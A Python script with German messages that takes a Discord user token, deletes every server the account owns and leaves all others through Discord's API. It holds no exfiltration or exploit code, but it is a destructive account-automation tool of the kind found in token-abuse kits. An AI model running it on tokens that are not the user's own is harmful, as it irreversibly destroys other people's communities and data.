import requests
import json
import time
from typing import List, Dict, Tuple
from utils.discord_utils import get_headers, validate_token

def get_user_guilds(token: str) -> List[Dict]:
    headers = get_headers(token)
    try:
        response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
        if response.status_code == 200:
            return response.json()
        return []
    except Exception as e:
        print(f"Fehler beim Abrufen der Server: {str(e)}")
        return []

def delete_owned_guild(token: str, guild_id: str) -> bool:
    headers = get_headers(token)
    try:
        response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/delete', headers=headers)
        return response.status_code == 204
    except Exception as e:
        print(f"Fehler beim Löschen des Servers: {str(e)}")
        return False

def leave_guild(token: str, guild_id: str) -> bool:
    headers = get_headers(token)
    try:
        response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers=headers)
        return response.status_code == 204
    except Exception as e:
        print(f"Fehler beim Verlassen des Servers: {str(e)}")
        return False

def leave_all_servers(token: str, delay: float = 1.0) -> Tuple[int, int, int, int]:
    if not validate_token(token):
        print("❌ Ungültiger Discord Token!")
        return 0, 0, 0, 0

    guilds = get_user_guilds(token)
    total = len(guilds)
    deleted = 0
    left = 0
    failed = 0

    print(f"\nGefundene Server: {total}")

    for guild in guilds:
        guild_id = guild['id']
        guild_name = guild.get('name', 'Unbekannt')
        is_owner = guild.get('owner', False)

        if is_owner:
            print(f"Lösche eigenen Server: {guild_name}...")
            if delete_owned_guild(token, guild_id):
                deleted += 1
                print(f"✓ Server erfolgreich gelöscht: {guild_name}")
            else:
                failed += 1
                print(f"✗ Fehler beim Löschen von: {guild_name}")
        else:
            print(f"Verlasse Server: {guild_name}...")
            if leave_guild(token, guild_id):
                left += 1
                print(f"✓ Server erfolgreich verlassen: {guild_name}")
            else:
                failed += 1
                print(f"✗ Fehler beim Verlassen von: {guild_name}")

        time.sleep(delay)

    return deleted, left, failed, total

if __name__ == "__main__":
    token = input("Discord Token eingeben: ")
    deleted, left, failed, total = leave_all_servers(token)
    print(f"\nErgebnis:")
    print(f"- {deleted} Server gelöscht")
    print(f"- {left} Server verlassen")
    print(f"- {failed} Fehler")
    print(f"- {total} Server insgesamt")